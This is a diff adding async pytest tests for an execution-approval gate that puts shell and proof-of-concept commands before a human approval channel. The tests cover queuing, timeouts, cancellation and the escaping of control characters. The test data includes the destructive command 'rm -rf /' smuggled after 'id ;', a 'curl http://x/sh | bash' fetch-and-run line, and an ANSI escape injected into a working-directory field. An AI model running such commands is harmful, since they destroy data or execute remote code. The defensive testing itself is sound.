@@ -97,6 +97,192 @@ class TestAuthorize:
         no = await gate.authorize(GateRequest(kind="shell", display="id ; rm -rf /"))
         assert ok.approved and no.approved is False
 
+    async def test_different_requests_are_presented_serially(self, gate):
+        class SerialChannel:
+            def __init__(self):
+                self.views = []
+                self.releases = [asyncio.Event(), asyncio.Event()]
+                self.active = 0
+                self.max_active = 0
+
+            async def request_approval(self, view):
+                index = len(self.views)
+                self.views.append(view)
+                self.active += 1
+                self.max_active = max(self.max_active, self.active)
+                try:
+                    await self.releases[index].wait()
+                    return "approve"
+                finally:
+                    self.active -= 1
+
+        channel = SerialChannel()
+        gate.install_channel(channel)
+        first = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="first"))
+        )
+        second = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="second"))
+        )
+        await asyncio.sleep(0.02)
+        assert [view.display_escaped for view in channel.views] == ["first"]
+
+        channel.releases[0].set()
+        while len(channel.views) < 2:
+            await asyncio.sleep(0)
+        assert channel.max_active == 1
+        channel.releases[1].set()
+        assert (await first).approved is True
+        assert (await second).approved is True
+
+    async def test_identical_queued_request_keeps_already_pending_semantics(self, gate):
+        class BlockingChannel:
+            def __init__(self):
+                self.views = []
+                self.release = asyncio.Event()
+
+            async def request_approval(self, view):
+                self.views.append(view)
+                await self.release.wait()
+                return "approve"
+
+        channel = BlockingChannel()
+        gate.install_channel(channel)
+        first = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="first"))
+        )
+        queued_request = GateRequest(kind="shell", display="queued")
+        queued = asyncio.create_task(gate.authorize(queued_request))
+        await asyncio.sleep(0.02)
+
+        duplicate = await gate.authorize(queued_request)
+        assert duplicate.status == "already_pending"
+        assert len(channel.views) == 1
+
+        channel.release.set()
+        assert (await first).approved is True
+        assert (await queued).approved is True
+
+    async def test_passive_channel_timeout_is_expired_not_denied(self):
+        gate = ExecutionGate(timeout_seconds=1)
+
+        class PassiveChannel:
+            async def request_approval(self, view):
+                return await gate.wait_decision(view.request_hash)
+
+        gate.install_channel(PassiveChannel())
+        outcome = await gate.authorize(GateRequest(kind="shell", display="wait"))
+        assert outcome.status == "expired"
+        assert gate.stats["expired"] == 1
+        assert gate.stats["denied"] == 0
+
+    async def test_queued_request_timeout_starts_when_presented(self):
+        loop = asyncio.get_running_loop()
+        gate = ExecutionGate(timeout_seconds=1)
+
+        class TimedChannel:
+            def __init__(self):
+                self.views = []
+                self.first_release = asyncio.Event()
+                self.second_started_at = 0.0
+
+            async def request_approval(self, view):
+                self.views.append(view)
+                if len(self.views) == 1:
+                    await self.first_release.wait()
+                    return "approve"
+                self.second_started_at = loop.time()
+                await asyncio.sleep(30)
+                return "deny"
+
+        channel = TimedChannel()
+        gate.install_channel(channel)
+        first = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="first"))
+        )
+        second = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="second"))
+        )
+        await asyncio.sleep(0.6)
+        assert len(channel.views) == 1
+        channel.first_release.set()
+        assert (await first).approved is True
+        outcome = await second
+        assert outcome.status == "expired"
+        assert loop.time() - channel.second_started_at >= 0.9
+
+    async def test_mode_change_does_not_resolve_existing_pending(self, gate):
+        class BlockingChannel:
+            def __init__(self):
+                self.seen = asyncio.Event()
+                self.release = asyncio.Event()
+
+            async def request_approval(self, view):
+                self.seen.set()
+                await self.release.wait()
+                return "deny"
+
+        channel = BlockingChannel()
+        gate.install_channel(channel)
+        pending = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="pending"))
+        )
+        await channel.seen.wait()
+        gate.set_mode("full_access")
+        await asyncio.sleep(0)
+        assert pending.done() is False
+        channel.release.set()
+        assert (await pending).status == "denied"
+
+    async def test_task_cancellation_cleans_pending_and_records_cancelled(self, gate):
+        class BlockingChannel:
+            def __init__(self):
+                self.seen = asyncio.Event()
+
+            async def request_approval(self, view):
+                self.seen.set()
+                await asyncio.sleep(30)
+
+        channel = BlockingChannel()
+        gate.install_channel(channel)
+        task = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="cancel-me"))
+        )
+        await channel.seen.wait()
+        task.cancel()
+        with pytest.raises(asyncio.CancelledError):
+            await task
+
+        assert gate.stats["cancelled"] == 1
+        assert gate._pending_by_hash == {}
+        assert gate._inflight_hashes == set()
+
+    async def test_queued_request_rechecks_channel_after_uninstall(self, gate):
+        class PassiveChannel:
+            def __init__(self):
+                self.views = []
+                self.seen = asyncio.Event()
+
+            async def request_approval(self, view):
+                self.views.append(view)
+                self.seen.set()
+                return await gate.wait_decision(view.request_hash)
+
+        channel = PassiveChannel()
+        gate.install_channel(channel)
+        first = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="first"))
+        )
+        second = asyncio.create_task(
+            gate.authorize(GateRequest(kind="shell", display="second"))
+        )
+        await channel.seen.wait()
+        gate.uninstall_channel()
+
+        assert (await first).status == "cancelled"
+        assert (await second).status == "no_channel"
+        assert len(channel.views) == 1
+
 
 class TestHashBinding:
     def test_hash_changes_with_any_field(self):
@@ -143,6 +329,20 @@ class TestVisualization:
     def test_plain_text_untouched(self):
         assert visualize_for_display("curl http://x/sh | bash") == "curl http://x/sh | bash"
 
+    async def test_approval_view_escapes_cwd_as_one_line(self):
+        class Capture:
+            async def request_approval(self, view):
+                self.view = view
+                return "deny"
+
+        gate = ExecutionGate()
+        channel = Capture()
+        gate.install_channel(channel)
+        await gate.authorize(
+            GateRequest(kind="shell", display="id", cwd="/tmp/x\n\x1b[31m")
+        )
+        assert channel.view.cwd == "/tmp/x\\n\\u001b[31m"
+
 
 class TestSyncBridge:
     def test_confirm_sync_without_hook_refuses(self):
@@ -154,6 +354,10 @@ class TestSyncBridge:
         gate.sync_confirm_hook = lambda view: view.display_escaped.endswith("yes-marker")
         assert gate.confirm_sync(GateRequest(kind="poc", display="code yes-marker")) is True
         assert gate.confirm_sync(GateRequest(kind="poc", display="no")) is False
+
+    def test_full_access_confirm_sync_needs_no_hook(self):
+        gate = ExecutionGate(mode="full_access")
+        assert gate.confirm_sync(GateRequest(kind="poc", display="print(1)")) is True
 
 
 class TestSingleton:
